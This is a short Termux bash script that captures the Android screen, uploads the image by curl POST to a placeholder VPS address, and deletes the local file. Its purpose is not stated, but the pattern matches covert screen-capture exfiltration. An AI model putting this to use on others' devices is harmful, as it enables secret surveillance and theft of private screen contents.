#!/bin/bash

SERVER="http://<IP_VPS>:5000"
SCREENSHOT_FILE="$HOME/screenshot.png"

termux-screencap -o "$SCREENSHOT_FILE"
curl -X POST -F "file=@$SCREENSHOT_FILE" "$SERVER/upload"
rm "$SCREENSHOT_FILE"
